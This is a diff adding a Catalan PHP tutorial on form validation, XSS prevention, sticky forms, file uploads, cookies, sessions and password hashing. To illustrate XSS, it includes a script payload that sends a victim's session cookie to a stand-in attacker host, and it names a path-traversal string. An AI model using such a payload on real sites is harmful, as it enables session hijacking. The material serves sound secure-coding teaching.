+`filter_var()` amb `FILTER_VALIDATE_INT` o `FILTER_VALIDATE_FLOAT` retorna `false` si el valor no és vàlid, la qual cosa permet distingir-lo fàcilment d'un `0` legítim (sempre que es compare amb `===`, mai amb `==`).
+:::
+
+> 📖 Documentació oficial: [PHP: filter_var](https://www.php.net/manual/es/function.filter-var.php) · [PHP: Filtres disponibles](https://www.php.net/manual/es/filter.filters.php)
+
+
+### Acumular i mostrar errors: patró complet
+
+En un formulari real, no interessa mostrar només el primer error, sinó **acumular-los tots** i mostrar-los junts a l'usuari.
+
+```php
+<?php
+$errors = [];
+
+$nom = trim($_POST['nom'] ?? '');
+$email = trim($_POST['email'] ?? '');
+$edat = filter_var($_POST['edat'] ?? '', FILTER_VALIDATE_INT);
+
+if ($nom === '') {
+    $errors[] = 'El nom és obligatori.';
+}
+
+if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+    $errors[] = 'L\'email no és vàlid.';
+}
+
+if ($edat === false || $edat < 0) {
+    $errors[] = 'L\'edat ha de ser un número positiu.';
+}
+
+if (empty($errors)) {
+    // Totes les dades són vàlides: es pot processar el formulari
+    echo 'Formulari enviat correctament!';
+} else {
+    foreach ($errors as $error) {
+        echo "<p style='color:red'>$error</p>";
+    }
+}
+```
+
+::: info Nota
+Este patró d'acumular errors en un array és la base del que veurem al punt 4.4 (*sticky forms*), on a més de mostrar els errors, tornarem a omplir el formulari amb els valors que l'usuari ja havia introduït.
+:::
+
+---
+
+📌 **A recordar:** valida sempre al servidor, encara que ja hi haja validació HTML/JavaScript; usa `filter_var()` com a primera opció per a validacions comunes (email, URL, nombres) i expressions regulars per a formats específics.
+
+> 📖 Documentació oficial: [PHP: Validating Filters](https://www.php.net/manual/es/filter.filters.validate.php) · [PHP: PCRE (expressions regulars)](https://www.php.net/manual/es/book.pcre.php)
+
+### 4.3. Seguretat XSS
+
+**XSS** (*Cross-Site Scripting*) és un atac que consisteix a injectar codi JavaScript maliciós dins d'una pàgina web, aprofitant-se que l'aplicació mostra dades introduïdes per un usuari **sense sanejar-les**. Si eixe codi s'executa en el navegador d'un altre usuari, pot robar cookies de sessió, suplantar la identitat, redirigir a pàgines falses, etc.
+
+::: danger Error crític
+Qualsevol dada que provinga de l'usuari (`$_GET`, `$_POST`, `$_COOKIE`, capçaleres HTTP...) s'ha de considerar **no confiable** i mai s'ha d'imprimir directament en HTML sense sanejar-la prèviament.
+:::
+
+#### Exemple d'atac
+
+Imagina un formulari de comentaris que mostra el que escriu l'usuari sense cap protecció:
+
+```php
+<?php
+// ❌ CODI VULNERABLE
+$comentari = $_POST['comentari'];
+echo "<p>$comentari</p>";
+```
+
+Si un usuari malintencionat escriu com a comentari:
+
+```html
+<script>document.location='http://atacant.com/robar?cookie=' + document.cookie</script>
+```
+
+Eixe script s'executaria en el navegador de **qualsevol altre usuari** que visualitze el comentari, enviant la seua cookie de sessió a un servidor extern.
+
+#### La solució: `htmlspecialchars()`
+
+Convertix els caràcters especials d'HTML (`<`, `>`, `"`, `'`, `&`) en les seues entitats corresponents, de manera que el navegador els mostre com a text pla en lloc d'interpretar-los com a codi.
+
+```php
+<?php
+// ✅ CODI SEGUR
+$comentari = $_POST['comentari'];
+echo "<p>" . htmlspecialchars($comentari, ENT_QUOTES, 'UTF-8') . "</p>";
+```
+
+Amb açò, el `<script>` de l'exemple anterior es mostraria literalment com a text (`&lt;script&gt;...`) en lloc d'executar-se.
+
+| Caràcter original | Entitat HTML |
+|---|---|
+| `<` | `&lt;` |
+| `>` | `&gt;` |
+| `"` | `&quot;` |
+| `'` | `&#039;` (amb `ENT_QUOTES`) |
+| `&` | `&amp;` |
+
+::: tip Bona pràctica
+Utilitza sempre el segon paràmetre `ENT_QUOTES` perquè també escape les cometes simples i dobles (per defecte, `ENT_QUOTES` només escapava les dobles en versions antigues de PHP). Des de PHP 8.1, `ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401` és el valor per defecte, però és recomanable indicar-lo explícitament per a claredat i compatibilitat.
+:::
+
+> 📖 Documentació oficial: [PHP: htmlspecialchars](https://www.php.net/manual/es/function.htmlspecialchars.php)
+
+#### On aplicar `htmlspecialchars()`
+
+La regla general és: **sanejar en el moment d'imprimir**, no en el moment de rebre la dada (així es manté la dada original intacta per a guardar-la a la base de dades o validar-la).
+
+```php
+<?php
+function e(string $valor): string {
+    return htmlspecialchars($valor, ENT_QUOTES, 'UTF-8');
+}
+```
+
+```php
+<h1><?= e($usuari['nom']) ?></h1>
+<p>Benvingut/da, <?= e($_GET['nom'] ?? 'convidat') ?></p>
+<input type="text" value="<?= e($_POST['nom'] ?? '') ?>">
+```
+
+::: info Nota
+Crear una xicoteta funció d'ajuda com `e()` (habitual en molts frameworks, inclòs Laravel amb la sintaxi `{{ }}`) evita escriure `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` repetidament i redueix el risc d'oblidar-ho en algun lloc.
+:::
+
+### Casos especials: atributs HTML i URLs
+
+```php
+<?php
+// Dins d'un atribut HTML: obligatori per a evitar tancar l'atribut amb cometes
+echo '<img src="foto.jpg" alt="' . e($_GET['alt'] ?? '') . '">';
+
+// Dins d'una URL: cal codificar-la amb urlencode(), no htmlspecialchars()
+$cercar = $_GET['q'] ?? '';
+echo '<a href="resultats.php?q=' . urlencode($cercar) . '">Cerca de nou</a>';
+```
+
+::: warning Atenció
+`htmlspecialchars()` protegeix el contingut **HTML**, però no és la ferramenta adequada per a inserir dades dins d'una URL (usa `urlencode()`/`rawurlencode()`) ni dins de JavaScript o CSS incrustat (estos casos requerixen un tractament específic que va més enllà d'esta unitat).
+:::
+
+
+---
+
+📌 **A recordar:** mai imprimisques dades de l'usuari directament en HTML; utilitza sempre `htmlspecialchars($valor, ENT_QUOTES, 'UTF-8')` en el moment de mostrar-les.
+
+> 📖 Documentació oficial: [OWASP: Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) · [PHP: htmlspecialchars](https://www.php.net/manual/es/function.htmlspecialchars.php)
+
+
+### 4.4. Sticky forms
+
+Un **sticky form** (formulari "enganxós") és aquell que, quan hi ha un error de validació, torna a mostrar-se **amb els valors que l'usuari ja havia introduït**, en lloc de tornar-lo a mostrar buit. Millora molt l'experiència d'usuari: ningú vol tornar a omplir un formulari sencer perquè s'ha equivocat només en un camp.
+
+::: info Nota
+La tècnica combina el que ja hem vist als punts 4.2 (validació) i 4.3 (XSS): es reomplin els camps amb els valors previs, però **sempre passant-los per `htmlspecialchars()`**, ja que tornem a imprimir dades de l'usuari en HTML.
+:::
+
+#### Patró bàsic: un únic arxiu per a formulari i processament
+
+La manera més senzilla d'implementar-ho és que el mateix arxiu PHP mostre el formulari i gestione l'enviament, comprovant el mètode de la petició amb `$_SERVER['REQUEST_METHOD']`.
+
+```php
+<?php
+function e(string $valor): string {
+    return htmlspecialchars($valor, ENT_QUOTES, 'UTF-8');
+}
+
+$errors = [];
+$nom = '';
+$email = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $nom = trim($_POST['nom'] ?? '');
+    $email = trim($_POST['email'] ?? '');
+
+    if ($nom === '') {
+        $errors[] = 'El nom és obligatori.';
+    }
+
+    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        $errors[] = 'L\'email no és vàlid.';
+    }
+
+    if (empty($errors)) {
+        // Dades vàlides: es processarien ací (guardar a BD, enviar email...)
+        echo '<p style="color:green">Formulari enviat correctament!</p>';
+        // Bona pràctica: buidar els valors per a no reomplir el formulari
+        $nom = '';
+        $email = '';
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="ca">
+<body>
+
+    <?php if (!empty($errors)): ?>
+        <ul style="color:red">
+            <?php foreach ($errors as $error): ?>
+                <li><?= e($error) ?></li>
+            <?php endforeach; ?>
+        </ul>
+    <?php endif; ?>
+
+    <form method="post" action="">
+        <label for="nom">Nom:</label>
+        <input type="text" id="nom" name="nom" value="<?= e($nom) ?>">
+
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" value="<?= e($email) ?>">
+
+        <button type="submit">Envia</button>
+    </form>
+
+</body>
+</html>
+```
+
+::: tip Bona pràctica
+Deixar l'atribut `action=""` buit (o ometre'l directament) fa que el formulari s'envie a la mateixa URL on es troba. És una manera còmoda de mantindre formulari i processament junts en el mateix arxiu, útil per a exemples senzills com este.
+:::
+
+#### Sticky en diferents tipus de camp
+
+No només els `input type="text"` necessiten ser "sticky": també els `select`, `checkbox` i `radio` han de recordar l'opció prèviament seleccionada.
+
+##### Select
+
+```php
+<?php
+$paisSeleccionat = $_POST['pais'] ?? '';
+$paisos = ['es' => 'Espanya', 'fr' => 'França', 'pt' => 'Portugal'];
+?>
+<select name="pais">
+    <option value="">-- Selecciona --</option>
+    <?php foreach ($paisos as $codi => $nomPais): ?>
+        <option value="<?= e($codi) ?>" <?= $paisSeleccionat === $codi ? 'selected' : '' ?>>
+            <?= e($nomPais) ?>
+        </option>
+    <?php endforeach; ?>
+</select>
+```
+
+##### Checkbox
+
+```php
+<?php
+$acceptaTermes = isset($_POST['termes']);
+?>
+<label>
+    <input type="checkbox" name="termes" <?= $acceptaTermes ? 'checked' : '' ?>>
+    Accepte els termes i condicions
+</label>
+```
+
+##### Checkboxes múltiples (recorda el punt 4.1)
+
+```php
+<?php
+$aficionsSeleccionades = $_POST['aficions'] ?? [];
+$totesAficions = ['lectura', 'esport', 'musica', 'videojocs'];
+?>
+<?php foreach ($totesAficions as $afició): ?>
+    <label>
+        <input type="checkbox" name="aficions[]" value="<?= e($afició) ?>"
+            <?= in_array($afició, $aficionsSeleccionades) ? 'checked' : '' ?>>
+        <?= e(ucfirst($afició)) ?>
+    </label>
+<?php endforeach; ?>
+```
+
+##### Radio buttons
+
+```php
+<?php
+$generSeleccionat = $_POST['genere'] ?? '';
+?>
+<label><input type="radio" name="genere" value="h" <?= $generSeleccionat === 'h' ? 'checked' : '' ?>> Home</label>
+<label><input type="radio" name="genere" value="d" <?= $generSeleccionat === 'd' ? 'checked' : '' ?>> Dona</label>
+```
+
+::: warning Atenció
+En `checked` i `selected`, **no cal** (ni s'ha de) passar el resultat per `htmlspecialchars()`: no estem imprimint dades de l'usuari, sinó generant un atribut HTML fix a partir d'una comparació booleana feta en PHP.
+:::
+
+#### Alternativa: separar formulari i processament en dos arxius
+
+Quan es prefereix separar la vista del processament (com vam vore al punt 3), les dades es passen normalment mitjançant `$_SESSION` (que veurem en detall al punt 5), ja que després d'un `header('Location: ...')` els valors de `$_POST` es perden.
+
+```php
+<?php
+// processar.php
+session_start();
+$nom = trim($_POST['nom'] ?? '');
+
+if ($nom === '') {
+    $_SESSION['errors'] = ['El nom és obligatori.'];
+    $_SESSION['old'] = ['nom' => $nom]; // valors previs
+    header('Location: formulari.php');
+    exit;
+}
+```
+
+```php
+<?php
+// formulari.php
+session_start();
+$errors = $_SESSION['errors'] ?? [];
+$old = $_SESSION['old'] ?? ['nom' => ''];
+unset($_SESSION['errors'], $_SESSION['old']); // Netejar per a la següent visita
+?>
+<input type="text" name="nom" value="<?= e($old['nom']) ?>">
+```
+
+::: info Nota
+Este patró (redirigir després d'un POST, en lloc de mostrar el resultat directament) es coneix com **PRG** (*Post/Redirect/Get*) i té una avantatge important: evita que, si l'usuari refresca la pàgina, el navegador torne a enviar el formulari (i, per exemple, duplique una comanda).
+:::
+
+---
+
+📌 **A recordar:** un sticky form reomplin sempre els valors previs de l'usuari, passats per `htmlspecialchars()`; per a `select`/`checkbox`/`radio` cal comparar el valor guardat per a decidir si s'afig `selected`/`checked`.
+
+> 📖 Documentació oficial: [PHP: $_SERVER](https://www.php.net/manual/es/reserved.variables.server.php) · [PHP: Formularios HTML](https://www.php.net/manual/es/language.variables.external.php)
+
+
+### 4.5. Pujar arxius i imatges
+
+Per a permetre que un usuari puge un arxiu (una imatge de perfil, un currículum en PDF...) calen dos requisits imprescindibles: que el formulari tinga l'atribut `enctype="multipart/form-data"` i que el mètode siga `POST` (els arxius **no** es poden pujar amb `GET`).
+
+::: warning Atenció
+Si s'oblida l'`enctype="multipart/form-data"`, el formulari s'enviarà igualment, però l'array `$_FILES` estarà **buit**: és l'error més freqüent en pujar arxius.
+:::
+
+```html
+<form method="post" action="pujar.php" enctype="multipart/form-data">
+    <label for="foto">Selecciona una imatge:</label>
+    <input type="file" id="foto" name="foto" accept="image/*">
+
+    <button type="submit">Puja</button>
+</form>
+```
+
+#### L'array `$_FILES`
+
+Ja el vam introduir breument al punt 1. Quan es puja un arxiu amb `name="foto"`, PHP genera automàticament esta estructura:
+
+```php
+<?php
+print_r($_FILES['foto']);
+/*
+Array
+(
+    [name]     => vacances.jpg      // Nom original de l'arxiu al PC de l'usuari
+    [type]     => image/jpeg        // Tipus MIME que envia el navegador (no fiable!)
+    [tmp_name] => /tmp/phpA1B2C3    // Ruta temporal on PHP l'ha guardat
+    [error]    => 0                 // Codi d'error (0 = sense errors)
+    [size]     => 204800            // Grandària en bytes
+)
+*/
+```
+
+> 📖 Documentació oficial: [PHP: $_FILES](https://www.php.net/manual/es/reserved.variables.files.php)
+
+#### Codis d'error de pujada
+
+Abans de processar l'arxiu, cal comprovar sempre el camp `error`:
+
+| Constant | Valor | Significat |
+|---|---|---|
+| `UPLOAD_ERR_OK` | 0 | Sense errors |
+| `UPLOAD_ERR_INI_SIZE` | 1 | Supera `upload_max_filesize` del `php.ini` |
+| `UPLOAD_ERR_FORM_SIZE` | 2 | Supera el `MAX_FILE_SIZE` del formulari |
+| `UPLOAD_ERR_PARTIAL` | 3 | L'arxiu només s'ha pujat parcialment |
+| `UPLOAD_ERR_NO_FILE` | 4 | No s'ha pujat cap arxiu |
+
+```php
+<?php
+if ($_FILES['foto']['error'] !== UPLOAD_ERR_OK) {
+    die('Error en la pujada de l\'arxiu.');
+}
+```
+
+> 📖 Documentació oficial: [PHP: Mensajes de error al subir archivos](https://www.php.net/manual/es/features.file-upload.errors.php)
+
+#### Validar el tipus i la grandària de l'arxiu
+
+::: danger Error crític
+**Mai** et fies del camp `$_FILES['foto']['type']` per a validar el tipus d'arxiu: eixe valor l'envia el navegador del client i es pot falsificar fàcilment. Per a comprovar el tipus real cal inspeccionar el **contingut** de l'arxiu.
+:::
+
+```php
+<?php
+$arxiuTemporal = $_FILES['foto']['tmp_name'];
+$grandariaMaxima = 2 * 1024 * 1024; // 2 MB
+
+// ✅ Comprova el tipus real llegint la capçalera de l'arxiu (finfo)
+$finfo = new finfo(FILEINFO_MIME_TYPE);
+$tipusReal = $finfo->file($arxiuTemporal);
+
+$tipusPermesos = ['image/jpeg', 'image/png', 'image/webp'];
+
+if (!in_array($tipusReal, $tipusPermesos, true)) {
+    die('Només es permeten imatges JPEG, PNG o WEBP.');
+}
+
+if ($_FILES['foto']['size'] > $grandariaMaxima) {
+    die('L\'arxiu no pot superar els 2 MB.');
+}
+```
+
+> 📖 Documentació oficial: [PHP: fileinfo](https://www.php.net/manual/es/book.fileinfo.php)
+
+::: tip Bona pràctica
+Per a validar específicament que un arxiu és una imatge vàlida (i no, per exemple, un arxiu PHP disfressat amb extensió `.jpg`), la funció `getimagesize()` és encara més fiable: si l'arxiu no és una imatge real, retorna `false`.
+:::
+
+```php
+<?php
+if (getimagesize($arxiuTemporal) === false) {
+    die('L\'arxiu no és una imatge vàlida.');
+}
+```
+
+> 📖 Documentació oficial: [PHP: getimagesize](https://www.php.net/manual/es/function.getimagesize.php)
+
+#### Moure l'arxiu a la seua ubicació definitiva
+
+L'arxiu pujat es guarda inicialment en una carpeta temporal del sistema i **s'elimina automàticament** en acabar l'script si no es mou. Cal usar sempre `move_uploaded_file()` (mai `copy()` ni `rename()`) per motius de seguretat: esta funció comprova que l'arxiu prové realment d'una pujada HTTP.
+
+```php
+<?php
+$carpetaDesti = __DIR__ . '/pujades/';
+$nomOriginal = basename($_FILES['foto']['name']);
+$extensio = strtolower(pathinfo($nomOriginal, PATHINFO_EXTENSION));
+
+// Generar un nom únic per a evitar sobreescriure arxius existents
+$nomFinal = uniqid('img_', true) . '.' . $extensio;
+$rutaDesti = $carpetaDesti . $nomFinal;
+
+if (move_uploaded_file($arxiuTemporal, $rutaDesti)) {
+    echo "Arxiu pujat correctament com a: " . htmlspecialchars($nomFinal);
+} else {
+    echo 'Error en moure l\'arxiu.';
+}
+```
+
+::: warning Atenció
+No confies mai en `$_FILES['foto']['name']` per a construir la ruta final sense processar-lo abans: podria contindre caràcters perillosos o intents de *path traversal* (com `../../etc/passwd`). Genera sempre un nom nou (per exemple, amb `uniqid()`) i queda't només amb l'extensió del nom original.
+:::
+
+> 📖 Documentació oficial: [PHP: move_uploaded_file](https://www.php.net/manual/es/function.move-uploaded-file.php)
+
+#### Configuració rellevant al `php.ini`
+
+Estos límits es configuren al servidor i no es poden canviar des de PHP en temps d'execució:
+
+```ini
+upload_max_filesize = 2M
+post_max_size = 8M
+max_file_uploads = 20
+```
+
+::: info Nota
+`post_max_size` ha de ser sempre **igual o major** que `upload_max_filesize`, ja que l'arxiu viatja dins del cos de la petició `POST`.
+:::
+
+### Pujar diversos arxius alhora
+
+Combinant el que hem vist al punt 4.1 (arrays en formularis), es poden pujar múltiples arxius amb un mateix camp:
+
+```html
+<input type="file" name="fotos[]" multiple accept="image/*">
+```
+
+```php
+<?php
+// Amb múltiples arxius, $_FILES['fotos'] té una estructura una mica diferent:
+// cada propietat (name, type, tmp_name...) és un array indexat
+$total = count($_FILES['fotos']['name']);
+
+for ($i = 0; $i < $total; $i++) {
+    if ($_FILES['fotos']['error'][$i] === UPLOAD_ERR_OK) {
+        $tmpName = $_FILES['fotos']['tmp_name'][$i];
+        $nomFinal = uniqid('img_', true) . '.' .
+            pathinfo($_FILES['fotos']['name'][$i], PATHINFO_EXTENSION);
+
+        move_uploaded_file($tmpName, __DIR__ . '/pujades/' . $nomFinal);
+    }
+}
+```
+
+::: warning Atenció
+Amb pujades múltiples, l'estructura de `$_FILES` **no** és un array de sub-arrays per arxiu, sinó un array de propietats on cada propietat és, al seu torn, un array indexat per posició. Cal iterar amb un índex comú (`$i`) per a totes les propietats, com mostra l'exemple.
+:::
+
+---
+
+📌 **A recordar:** valida sempre el tipus real de l'arxiu (mai el camp `type` de `$_FILES`), limita la grandària, i utilitza `move_uploaded_file()` amb un nom generat automàticament per a evitar sobreescritures i problemes de seguretat.
+
+> 📖 Documentació oficial: [PHP: Subir archivos con POST](https://www.php.net/manual/es/features.file-upload.post-method.php) · [PHP: move_uploaded_file](https://www.php.net/manual/es/function.move-uploaded-file.php) · [PHP: fileinfo](https://www.php.net/manual/es/book.fileinfo.php)
+
+
+## 5. Cookies i sessions
+
+HTTP és un protocol **sense estat** (*stateless*): cada petició que arriba al servidor és independent de les anteriors, i el servidor no "recorda" per si sol qui és l'usuari d'una petició a la següent. Les **cookies** i les **sessions** són els dos mecanismes principals que permeten mantindre informació entre peticions (per exemple, saber que un usuari ha iniciat sessió).
+
+::: info Nota
+Encara que sovint es parlen juntes, cookies i sessions són tècniques diferents i complementàries: les cookies guarden dades **en el navegador** de l'usuari, mentre que les sessions guarden dades **en el servidor**, identificant a l'usuari mitjançant un identificador que sí viatja en una cookie.
+:::
+
+### Cookies
+
+Una cookie és un xicotet fragment d'informació (clau-valor) que el servidor envia al navegador, i que este torna a enviar automàticament en cada petició posterior al mateix domini.
+
+#### Crear una cookie: `setcookie()`
+
+```php
+<?php
+setcookie('tema', 'fosc', time() + 3600 * 24 * 30); // Expira en 30 dies
+```
+
+::: danger Error crític
+Igual que amb `header()` (punt 2), `setcookie()` envia una capçalera HTTP i, per tant, s'ha de cridar **abans** que s'envie qualsevol contingut a la pàgina.
+:::
+
+Paràmetres més habituals de `setcookie()`:
+
+```php
+<?php
+setcookie(
+    name: 'tema',
+    value: 'fosc',
+    expires_or_options: time() + 3600 * 24 * 30, // Data d'expiració (timestamp)
+    path: '/',            // Disponible en tot el lloc web
+    domain: '',           // Domini actual
+    secure: true,          // Només s'envia per HTTPS
+    httponly: true         // No accessible des de JavaScript (protecció XSS)
+);
+```
+
+::: tip Bona pràctica
+Activa sempre `httponly: true` en cookies sensibles (com la de sessió): impedix que JavaScript hi accedisca amb `document.cookie`, reduint l'impacte d'un possible atac XSS (vist al punt 4.3). Activa `secure: true` sempre que el lloc funcione amb HTTPS.
+:::
+
+> 📖 Documentació oficial: [PHP: setcookie](https://www.php.net/manual/es/function.setcookie.php)
+
+#### Llegir una cookie
+
+Ja ho vam vore al punt 1: es fa a través de la supervariable `$_COOKIE`.
+
+```php
+<?php
+$tema = $_COOKIE['tema'] ?? 'clar'; // Valor per defecte si no existeix
+```
+
+::: warning Atenció
+Quan es crea una cookie amb `setcookie()`, esta **no** estarà disponible a `$_COOKIE` fins a la **següent** petició HTTP. Dins del mateix script on s'ha creat, encara no hi serà.
+:::
+
+#### Eliminar una cookie
+
+No existeix una funció `deletecookie()`: s'elimina establint una data d'expiració en el passat.
+
+```php
+<?php
+setcookie('tema', '', time() - 3600, '/');
+```
+
+#### Sense data d'expiració: *session cookies*
+
+Si no s'indica el paràmetre `expires`, la cookie és una **cookie de sessió del navegador**: desapareix quan l'usuari tanca el navegador (no s'ha de confondre amb les sessions de PHP, que veurem tot seguit).
+
+```php
+<?php
+setcookie('avis_acceptat', '1'); // S'elimina en tancar el navegador
+```
+
+### Sessions
+
+Una sessió permet guardar dades associades a un usuari **en el servidor**, evitant els límits de grandària i les qüestions de seguretat de guardar-ho tot en cookies. El client només rep, mitjançant una cookie (per defecte anomenada `PHPSESSID`), un identificador únic de sessió; les dades reals mai viatgen al navegador.
+
+#### Iniciar una sessió: `session_start()`
+
+```php
+<?php
+session_start(); // Ha d'anar SEMPRE al principi de l'script, abans de cap eixida
+```
+
+::: danger Error crític
+`session_start()` també envia una capçalera (la cookie `PHPSESSID`), per la qual cosa s'aplica la mateixa regla que amb `header()`: cap contingut abans de cridar-la. A més, **s'ha de cridar en tots els arxius** que necessiten llegir o escriure `$_SESSION`.
+:::
+
+#### Guardar i llegir dades de sessió
+
+Una vegada iniciada, `$_SESSION` es comporta com un array associatiu normal:
+
+```php
+<?php
+session_start();
+
+$_SESSION['usuari'] = 'ana';
+$_SESSION['rol'] = 'estudiant';
+$_SESSION['carret'] = ['llapis', 'quadern'];
+```
+
+```php
+<?php
+// En una altra pàgina, també cal cridar session_start() primer
+session_start();
+
+echo 'Sessió iniciada per: ' . htmlspecialchars($_SESSION['usuari'] ?? 'ningú');
+```
+
+> 📖 Documentació oficial: [PHP: $_SESSION](https://www.php.net/manual/es/reserved.variables.session.php) · [PHP: session_start](https://www.php.net/manual/es/function.session-start.php)
+
+#### Eliminar dades i tancar la sessió
+
+```php
+<?php
+session_start();
+
+unset($_SESSION['carret']);      // Elimina només una clau
+$_SESSION = [];                   // Buida totes les dades de la sessió
+
+session_destroy();                // Destruïx la sessió al servidor
+```
+
+> 📖 Documentació oficial: [PHP: session_destroy](https://www.php.net/manual/es/function.session-destroy.php)
+
+#### Exemple pràctic: comptador de visites
+
+```php
+<?php
+session_start();
+
+$_SESSION['visites'] = ($_SESSION['visites'] ?? 0) + 1;
+
+echo "Has visitat esta pàgina {$_SESSION['visites']} vegades.";
+```
+
+#### Exemple pràctic: control d'accés bàsic
+
+```php
+<?php
+// pagina_privada.php
+session_start();
+
+if (!isset($_SESSION['usuari'])) {
+    header('Location: login.php');
+    exit;
+}
+
+echo 'Benvingut/da, ' . htmlspecialchars($_SESSION['usuari']);
+```
+
+::: info Nota
+Este patró és la base de l'autenticació d'usuaris que veurem en detall al punt 6: la sessió és el mecanisme que "recorda" que un usuari ha iniciat sessió correctament en peticions successives.
+:::
+
+### Cookies vs Sessions: quan usar cada una
+
+| | Cookies | Sessions |
+|---|---|---|
+| On es guarden les dades | Navegador del client | Servidor |
+| Grandària màxima | ~4 KB per cookie | Sense límit pràctic |
+| Durada | Configurable (dies, mesos...) | Normalment fins tancar el navegador |
+| Visibilitat per a l'usuari | Pot veure-les i editar-les | No té accés directe |
+| Ús típic | Preferències (tema, idioma), "recorda'm" | Dades d'autenticació, carret de compra |
+
+---
+
+📌 **A recordar:** `setcookie()` i `session_start()` han de cridar-se abans de qualsevol eixida; les cookies guarden dades al client (útils per a preferències), les sessions al servidor (útils per a dades sensibles com l'autenticació).
+
+> 📖 Documentació oficial: [PHP: Manejo de sesiones](https://www.php.net/manual/es/book.session.php) · [PHP: Manejo de cookies con HTTP](https://www.php.net/manual/es/features.cookies.php)
+
+## 6. Autenticació d'usuaris (password_hash i password_verify)
+
+Autenticar un usuari significa comprovar que la contrasenya que introduïx coincidix amb la que té registrada. El punt més important d'esta secció és entendre que **mai s'ha de guardar una contrasenya en text pla** a la base de dades: si algú accedira a la BD (per un atac, una fuga de dades...), tindria accés directe a totes les contrasenyes dels usuaris.
+
+::: danger Error crític
+Guardar contrasenyes en text pla, o fins i tot amb algorismes de xifratge reversible, és una **greu vulnerabilitat de seguretat**. Les contrasenyes s'han de guardar sempre amb una funció de **hash** dissenyada específicament per a este propòsit.
+:::
+
+### Per què no n'hi ha prou amb `md5()` o `sha1()`
+
+Podries pensar a utilitzar funcions com `md5()` o `sha1()` per a "amagar" la contrasenya. **No ho faces mai.** Estos algorismes es van dissenyar per a ser **ràpids**, la qual cosa és exactament el contrari del que interessa per a contrasenyes: un atacant amb la BD filtrada podria provar milers de milions de combinacions per segon (*força bruta*, taules *rainbow*) fins a trobar la contrasenya original.
+
+```php
+<?php
+// ❌ MAI FACES AIXÒ
+$hashInsegur = md5($contrasenya); // Trencable en fraccions de segon
+```
+
+### La solució: `password_hash()`
+
+PHP incorpora una API específica per a gestionar contrasenyes de manera segura, que utilitza l'algorisme **bcrypt** per defecte (dissenyat per ser intencionadament lent i costós de calcular, dificultant els atacs de força bruta).
+
+```php
+<?php
+$contrasenya = 'laMeuaContrasenya123';
+
+$hash = password_hash($contrasenya, PASSWORD_DEFAULT);
+
+echo $hash;
+// Eixida (sempre diferent, encara que la contrasenya siga la mateixa):
+// $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi
+```
+
+::: info Nota
+Cada vegada que crides `password_hash()` amb la mateixa contrasenya, obtens un resultat **diferent**. Açò es deu al fet que la funció incorpora automàticament un valor aleatori (*salt*) en el hash, evitant que dos usuaris amb la mateixa contrasenya tinguen el mateix hash guardat.
+:::
+
+`PASSWORD_DEFAULT` utilitza sempre l'algorisme recomanat per l'equip de PHP en cada versió (actualment **bcrypt**), i pot canviar en versions futures de PHP a mesura que apareguen algorismes millors. Per això és preferible a especificar un algorisme fix com `PASSWORD_BCRYPT`.
+
+> 📖 Documentació oficial: [PHP: password_hash](https://www.php.net/manual/es/function.password-hash.php)
+
+### Registrar un usuari
+
+```php
+<?php
+$contrasenya = $_POST['contrasenya'] ?? '';
+$confirmacio = $_POST['confirmacio'] ?? '';
+
+if ($contrasenya !== $confirmacio) {
+    $errors[] = 'Les contrasenyes no coincidixen.';
+} elseif (strlen($contrasenya) < 8) {
+    $errors[] = 'La contrasenya ha de tindre almenys 8 caràcters.';
+}
+
+if (empty($errors)) {
+    $hash = password_hash($contrasenya, PASSWORD_DEFAULT);
+
+    // En un cas real, ací es guardaria $hash a la base de dades
+    // NUNCA es guarda $contrasenya (la original en text pla)
+    echo 'Usuari registrat correctament.';
+}
+```
+
+### Verificar una contrasenya: `password_verify()`
+
+Per a comprovar si la contrasenya que introduïx l'usuari en iniciar sessió és correcta, **no es desxifra el hash** (bcrypt no és reversible): es torna a fer el càlcul i es comprova si coincidix.
+
+```php
+<?php
+$contrasenyaIntroduida = $_POST['contrasenya'] ?? '';
+
+// Este hash vindria normalment d'una consulta a la base de dades
+$hashGuardat = '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi';
+
+if (password_verify($contrasenyaIntroduida, $hashGuardat)) {
+    echo 'Contrasenya correcta!';
+} else {
+    echo 'Contrasenya incorrecta.';
+}
+```
+
+> 📖 Documentació oficial: [PHP: password_verify](https://www.php.net/manual/es/function.password-verify.php)
+
+### Exemple pràctic complet: registre i inici de sessió
+
+**`registre.php`** (simulant una "base de dades" amb un array, per simplicitat)
+
+```php
+<?php
+session_start();
+
+// Simulació d'una BD d'usuaris (en un cas real seria una taula de MySQL)
+$usuaris = [
+    'ana' => [
+        'hash' => password_hash('contrasenya123', PASSWORD_DEFAULT)
+    ]
+];
+```
+
+**`login.php`**
+
+```php
+<?php
+session_start();
+require 'usuaris_bd.php'; // Conté l'array $usuaris de l'exemple anterior
+
+$errors = [];
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $usuari = trim($_POST['usuari'] ?? '');
+    $contrasenya = $_POST['contrasenya'] ?? '';
+
+    if (isset($usuaris[$usuari]) && password_verify($contrasenya, $usuaris[$usuari]['hash'])) {
+        // Regenerar l'ID de sessió en autenticar: evita fixació de sessió
+        session_regenerate_id(true);
+
+        $_SESSION['usuari'] = $usuari;
+        header('Location: pagina_privada.php');
+        exit;
+    } else {
+        $errors[] = 'Usuari o contrasenya incorrectes.';
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="ca">
+<body>
+    <?php foreach ($errors as $error): ?>
+        <p style="color:red"><?= htmlspecialchars($error) ?></p>
+    <?php endforeach; ?>
+
+    <form method="post" action="">
+        <input type="text" name="usuari" placeholder="Usuari">
+        <input type="password" name="contrasenya" placeholder="Contrasenya">
+        <button type="submit">Inicia sessió</button>
+    </form>
+</body>
+</html>
+```
+
+::: tip Bona pràctica
+Crida sempre `session_regenerate_id(true)` just després d'autenticar un usuari correctament. Açò genera un nou identificador de sessió, evitant un tipus d'atac anomenat *fixació de sessió* (on un atacant força a una víctima a usar un ID de sessió que ja coneix).
+:::
+
